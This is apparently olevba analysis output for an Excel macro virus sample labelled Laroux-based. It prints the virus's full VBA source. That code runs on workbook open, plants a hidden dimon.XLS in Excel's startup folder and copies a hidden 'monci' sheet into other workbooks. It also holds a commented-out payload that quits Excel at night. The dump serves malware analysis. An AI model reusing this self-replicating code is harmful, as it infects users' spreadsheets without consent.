olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-4b99bb3be9865a13746cfe80714cd1b1b4f50679
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO monci.bas 
in file: Virus.MSExcel.Laroux-based-4b99bb3be9865a13746cfe80714cd1b1b4f50679 - OLE stream: '_VBA_PROJECT_CUR/VBA/monci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "vrs"
End Sub

Sub vrs()
Attribute vrs.VB_ProcData.VB_Invoke_Func = " \n14"
    AppStartPath$ = Application.StartupPath
    DimonExists$ = Dir(AppStartPath$ & "\" & "dimon.XLS")
    If DimonExists$ = "dimon.XLS" Then DimonValue = 1 Else DimonValue = 0
    If ActiveWorkbook.Modules.Count > 0 Then ModuleValue = 1 Else ModuleValue = 0
    whichfile = DimonValue + ModuleValue * 10
    '** Dimon exists, no modules = 1
    '** Dimon doesn't exist, no modules = 0   ** Impossible? **
    '** Dimon exists, X modules = X1, ie: 11, 21, 31
    '** Dimon doesn't exist, X modules = X0, ie: 10, 20, 30
    
    Select Case whichfile
        Case 10 '** Dimon doesn't exist, but there is a module, I would assume
                '** that module is this, since this is running.
            Application.ScreenUpdating = False
            WorkbookName$ = ActiveWorkbook.Name
            Sheets("monci").Visible = True
            Sheets("monci").Select
            Sheets("monci").Copy
            With ActiveWorkbook
                .Title = ""
                .Subject = ""
                .Author = ""
                .Keywords = ""
                .Comments = ""
            End With
            newname$ = ActiveWorkbook.Name  '** Redundant, WorkbookName$
                                            '** does the same
            OriginalDirectory$ = CurDir()
            ChDir Application.StartupPath
            ActiveWindow.Visible = False
            Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" _
                & "dimon.XLS", FileFormat:=xlNormal, Password:="", _
                WriteResPassword:="", ReadOnlyRecommended:=False, _
                CreateBackup:=False
            ChDir OriginalDirectory$
            Workbooks(WorkbookName$).Sheets("monci").Visible = False
            Application.OnSheetActivate = ""    '** Why? Perhaps to override it
                                                '** with this here, so instead
                                                '** of pointing to a random file,
                                                '** point to the stable virus.
            Application.ScreenUpdating = True
            Application.OnSheetActivate = "dimon.xls!vrs"
        Case 1  '** Dimon exists, no modules on this document, easy pickins.
            Application.ScreenUpdating = False
            WorkbookName$ = ActiveWorkbook.Name
            PathDir$ = ActiveWorkbook.Path
            SheetName$ = Workbooks(WorkbookName$).Sheets(1).Name
            If SheetName$ <> "monci" Then
                Workbooks("dimon.XLS").Sheets("monci").Copy _
                                      before:=Workbooks(WorkbookName$).Sheets(1)
                Workbooks(WorkbookName$).Sheets("monci").Visible = False
            Else
            End If
            Application.OnSheetActivate = ""    '** Same as above
            Application.ScreenUpdating = True
            Application.OnSheetActivate = "dimon.xls!vrs"
        Case 11 '** Dimon Exists, and there is one module, presumably monci
            Dim msg, Style, Title, Respon
            t$ = Time()
Rem             If t$ > "21:00:00" Then
Rem             msg = "Maaf, Sekarang Waktunya Untuk Berisitrahat"
Rem             style = vbOKOnly
Rem             title = "WARNING !!!"
Rem             Respon = MsgBox(msg, style, title)
Rem             If Respon = vbOK Then
Rem             Application.Quit
Rem             End If
Rem             Else
Rem             End If
        Case Else
    End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  monc
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

